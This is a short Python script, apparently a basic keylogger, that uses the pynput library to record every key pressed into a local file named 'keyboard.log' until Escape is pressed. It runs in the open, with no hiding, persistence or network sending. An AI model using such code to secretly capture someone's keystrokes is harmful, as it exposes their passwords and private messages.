from pynput import keyboard

def write(word):
	try:
		f = open("keyboard.log", "a")
		f.write(word)
	except:
		print("File cannot be open")
	finally:
		f.close()	


def on_press(key):
    try:
        a = 'alpanumerik key {0}'.format(key.char)
        write(a)
    except AttributeError:
        a = 'special key {0} pressed'.format(key)
        write(a)

def on_release(key):
    print('{0} released'.format(key))
    if key == keyboard.Key.esc:
        return False

with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()